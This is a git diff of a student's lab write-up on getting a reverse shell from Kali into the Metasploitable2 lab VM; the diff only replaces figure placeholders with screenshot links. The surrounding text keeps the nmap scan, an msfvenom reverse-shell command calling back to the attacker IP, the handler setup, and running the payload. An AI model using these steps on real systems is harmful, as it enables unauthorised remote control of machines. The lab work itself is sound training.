@@ -75,9 +75,7 @@ My Kali machine was assigned the IP address 192.168.56.4, and Metasploitable2 wa
 
 nmap \-sV 192.168.56.5
 
-![][image1]
-
-*Figure 1: Nmap \-sV scan of Metasploitable2 confirming 22 open vulnerable services including SSH on port 22*
+![alt text](ss/1.png)
 
 The scan results were eye-opening. Metasploitable2 had 22 open ports running intentionally outdated and vulnerable services — FTP (vsftpd 2.3.4, which has a known backdoor), Telnet, an unprotected MySQL instance, a bindshell on port 1524 that literally accepts any connection as root, and much more. I observed that in a real environment, a machine with this kind of exposure would be compromised very quickly. This reinforced why network hardening and attack surface reduction matter so much.
 
@@ -89,9 +87,8 @@ I generated a Linux ELF executable payload using the following command:
 
 msfvenom \-p linux/x86/shell\_reverse\_tcp LHOST=192.168.56.4 LPORT=4444 \-f elf \-o shell.elf
 
-![][image2]
+![alt text](ss/2.png)
 
-*Figure 2: msfvenom successfully generating the reverse shell payload — 68 bytes raw, 152 bytes as ELF binary*
 
 Watching the output, I noticed something interesting — msfvenom automatically selected the Linux platform and x86 architecture from the payload name, since I had not specified them explicitly. The final payload was just 152 bytes as an ELF file, which surprised me. I had imagined exploits would be much larger. The compactness of the payload is part of what makes it effective — it is small enough to be inconspicuous and easy to transfer.
 
@@ -103,15 +100,11 @@ Before executing the payload on the target, I needed to set up a listener on my 
 
 I launched msfconsole and searched for the handler module to find it:
 
-![][image3]
-
-*Figure 3: Searching for multi/handler in msfconsole — exploit/multi/handler appears at index 5 as a Generic Payload Handler*
+![alt text](ss/3.png)
 
 I then selected the module and configured it to match the payload I had generated — the same payload type, the same LHOST, and the same LPORT:
 
-![][image4]
-
-*Figure 4: Handler fully configured with matching payload, LHOST 192.168.56.4, and LPORT 4444 — ready to run*
+![alt text](ss/4.png)
 
 One thing I observed here was the importance of the payload, LHOST, and LPORT all matching exactly between msfvenom and the handler. If any of these are different, the listener will not recognise or accept the incoming connection. I actually experienced this earlier in the lab when port 4444 was already in use by a previous Metasploit session, causing a bind error. I had to kill the old process before the handler would start correctly — a small but practical lesson in process management.
 
@@ -125,9 +118,7 @@ scp \-o HostKeyAlgorithms=+ssh-rsa \-o PubkeyAcceptedKeyTypes=+ssh-rsa \\
 
 After transferring the file, I SSH'd into the target machine, made the payload executable, and ran it:
 
-![][image5]
-
-*Figure 5: SSH session on Metasploitable2 — payload made executable with chmod \+x and executed with ./tmp/shell.elf*
+![alt text](ss/5.png)
 
 The moment I ran /tmp/shell.elf, the terminal on Metasploitable2 appeared to freeze. I initially thought something had gone wrong — but this is exactly what is supposed to happen. The payload was executing silently in the background, and the terminal hung because the process was open, waiting. The real action was happening on the other side.
 
@@ -137,9 +128,7 @@ The moment I ran /tmp/shell.elf, the terminal on Metasploitable2 appeared to fre
 
 Switching to the msfconsole window on Kali, I saw the confirmation I had been working toward:
 
-![][image6]
-
-*Figure 6: Metasploit handler confirming session 1 opened — reverse connection from 192.168.56.5:57862 received*
+![alt text](ss/6.png)
 
 The session had opened. I now had an interactive command shell running on Metasploitable2, controlled entirely from my Kali machine. I ran a series of commands to confirm the access:
 
@@ -153,9 +142,9 @@ uname \-a  \=\>  Linux metasploitable 2.6.24-16-server
 
 ls /      \=\>  bin  boot  cdrom  dev  etc  home  lib  ...
 
-![][image7]
 
-*Figure 7: Active shell session — uname \-a confirms Linux kernel version, ls / lists the full root filesystem of the target*
+![alt text](ss/7.png)
+
 
 Seeing the filesystem of the target machine listed in my terminal was the clearest possible demonstration that RCE had succeeded. I could read files, write files, run any command — the machine was fully under my control without any physical access and with no visible indication to the victim that anything was wrong.
 
